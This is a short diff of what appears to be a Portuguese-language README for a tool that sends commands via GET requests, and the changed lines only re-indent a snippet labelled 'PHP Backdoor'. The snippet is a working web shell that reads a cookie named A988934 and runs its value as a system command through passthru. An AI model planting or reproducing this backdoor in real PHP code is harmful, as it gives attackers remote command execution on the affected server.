@@ -4,6 +4,6 @@ A mesma envia requisições do tipo GET com parametros setados no User-Agent par
 
 - PHP Backdoor...
 
-      if (isset($_COOKIE['A988934']) && !empty($_COOKIE['A988934'])) {
-        die(passthru($_COOKIE['A988934']));
-      }
+        if (isset($_COOKIE['A988934']) && !empty($_COOKIE['A988934'])) {
+          die(passthru($_COOKIE['A988934']));
+        }
